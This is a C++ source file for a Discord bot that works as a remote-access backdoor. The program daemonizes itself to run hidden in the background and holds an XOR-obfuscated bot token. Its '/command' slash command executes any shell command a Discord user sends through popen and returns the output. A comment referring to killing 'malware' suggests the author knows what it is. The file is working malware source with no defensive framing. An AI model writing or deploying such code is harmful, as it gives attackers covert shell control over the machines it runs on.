#include <dpp/appcommand.h>
#include <dpp/dispatcher.h>
#include <dpp/dpp.h>
#include <dpp/exception.h>
#include <stdlib.h>
#include <dpp/dpp.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>




const std::string BOT_TOKEN = "#LUP3L{@5Ok@2LED5OUf0Lkj5Lv/F2gswD/@hc55C9rPrU{vPUl1HtIcIFpET,pOOMfvUdS5#";

auto decode = [](std::string s) {
    for (char& c : s)
        c ^= 1;
    return s;
};

// Turns the software into a background running process (aka Daemon)
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS); // parent exits

    umask(0);
    if (setsid() < 0) exit(EXIT_FAILURE);

    if (chdir("/") < 0) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    open("/dev/null", O_RDONLY); // stdin
    open("/dev/null", O_WRONLY); // stdout
    open("/dev/null", O_RDWR);   // stderr
}


void run() {

    dpp::cluster bot(decode(BOT_TOKEN), dpp::i_message_content);

    // Register commands
    bot.on_ready([&bot](const dpp::ready_t& event) {
        if (dpp::run_once<struct register_commands>()) {

            dpp::slashcommand mission(
                "mission",
                "Show bot mission",
                bot.me.id
            );

            dpp::slashcommand killyourself(
                "killyourself",
                "Kills itself",
                bot.me.id
            );

            dpp::slashcommand command(
                "command",
                "Use this to send shell commands",
                bot.me.id
            );

            // Configures /command to give it a parameter for inputing linux commands
            command.add_option(dpp::command_option(
                dpp::co_string,
                "command",
                "The command to send",
                true
            ));


            bot.global_command_create(killyourself);
            bot.global_command_create(command);
            bot.global_command_create(mission);
        }
    });

    // handles slash commands from user
    bot.on_slashcommand([](const dpp::slashcommand_t& event) {

        if (event.command.get_command_name() == "mission") {
            event.reply("My mission is to serve you my service :3");
            return;
        }

         if (event.command.get_command_name() == "killyourself") {
            event.reply(" Killing process..\nProcess killed\nI'm Dead, Goodbye >_<");

            // system("kill $(pidof malware)");
            return;
        }
        

        //detectes if /commonad is called and takes the parameter and execute it into a shell, and returs the output
        if(event.command.get_command_name() == "command") {

            char buf[256];
            std::string output;

            dpp::command_value cv = event.get_parameter("command");
            std::string msg = std::get<std::string>(cv);
            FILE* fp = popen(msg.c_str(), "r");

            while (fgets(buf, sizeof(buf), fp)) {output += buf;}
            if (output.length() > 2000) {output = output.substr(0, 2000);};
            pclose(fp);
            event.reply(output);

        }

    });

    bot.start(dpp::st_wait);
}


int main() {

    daemonize();
    run();
    return 0;
}
